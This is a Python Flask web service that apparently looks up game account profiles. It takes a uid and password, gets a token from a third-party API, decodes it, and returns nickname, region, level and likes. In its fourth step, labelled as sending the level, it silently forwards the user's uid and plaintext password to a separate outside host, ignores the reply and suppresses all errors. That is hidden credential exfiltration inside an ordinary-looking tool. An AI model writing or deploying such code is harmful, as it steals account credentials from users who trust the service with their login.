from flask import Flask, request, jsonify
import requests
import base64
import json

app = Flask(__name__)

JWT_API = "https://jwtsemygen.vercel.app/token?key=SEMY&uid={uid}&password={password}"
INFO_API = "https://infosemy.vercel.app/ajay-info?uid={account_id}&region=IND"

# ---------------- JWT Decode ----------------
def decode_jwt(token):
    try:
        payload = token.split('.')[1]
        payload += '=' * (-len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        return {"error": f"JWT Decode Failed: {str(e)}"}

# ---------------- MAIN API ----------------
@app.route("/infosemy")
def infosemy():

    uid = request.args.get("uid")
    password = request.args.get("password")

    if not uid or not password:
        return jsonify({"error": "uid & password required"}), 400

    # ============ STEP 1 : JWT GENERATE ============
    try:
        jwt_url = JWT_API.format(uid=uid, password=password)
        jwt_response = requests.get(jwt_url, timeout=15)

        if jwt_response.status_code != 200:
            return jsonify({"error": "JWT API DOWN", "status": jwt_response.status_code})

        try:
            jwt_data = jwt_response.json()
        except:
            return jsonify({"error": "JWT API not returning JSON", "raw": jwt_response.text})

        if "token" not in jwt_data:
            return jsonify({"error": "Token not found", "response": jwt_data})

        token = jwt_data["token"]

    except Exception as e:
        return jsonify({"error": f"JWT API Failed: {str(e)}"})


    # ============ STEP 2 : JWT DECODE ============
    decoded = decode_jwt(token)

    if "account_id" not in decoded:
        return jsonify({"error": "account_id not found in JWT", "decoded": decoded})

    account_id = decoded["account_id"]


    # ============ STEP 3 : INFO API ============
    try:
        info_url = INFO_API.format(account_id=account_id)
        info_response = requests.get(info_url, timeout=15)

        try:
            info_data = info_response.json()
        except:
            return jsonify({"error": "Info API not returning JSON", "raw": info_response.text})

        basic = info_data.get("basicInfo")
        if not basic:
            return jsonify({"error": "basicInfo missing", "response": info_data})

        nickname = basic.get("nickname")
        region = basic.get("region")
        level = basic.get("level")
        likes = basic.get("liked")
        account_id_final = basic.get("accountId")

    except Exception as e:
        return jsonify({"error": f"Info API Failed: {str(e)}"})


    # ============ STEP 4 : HIT LAST API (LEVEL SEND) ============
    try:
        hit_url = f"https://infopapa.vercel.app/info?uid={uid}&password={password}&level={level}"
        requests.get(hit_url, timeout=10)
    except:
        pass


    # ============ FINAL RESPONSE ============
    return jsonify({
        "Nickname": nickname,
        "Region": region,
        "Level": level,
        "Likes": likes,
        "Account_Id": account_id_final
    })


# Vercel entry
app = app
